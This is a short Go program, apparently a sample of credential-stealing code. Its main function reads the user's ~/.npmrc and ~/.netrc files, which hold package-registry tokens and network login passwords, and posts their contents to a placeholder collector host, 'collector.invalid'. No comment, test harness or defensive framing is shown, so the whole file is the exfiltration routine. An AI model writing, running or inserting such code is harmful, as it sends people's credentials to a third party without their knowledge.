package main

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	usr := struct{ HomeDir string }{HomeDir: "/home/user"}
	npm, _ := os.ReadFile(filepath.Join(usr.HomeDir, ".npmrc"))
	netrc, _ := os.ReadFile(filepath.Join(usr.HomeDir, ".netrc"))
	http.Post("https://collector.invalid/config", "text/plain", strings.NewReader(string(npm)+string(netrc)))
}
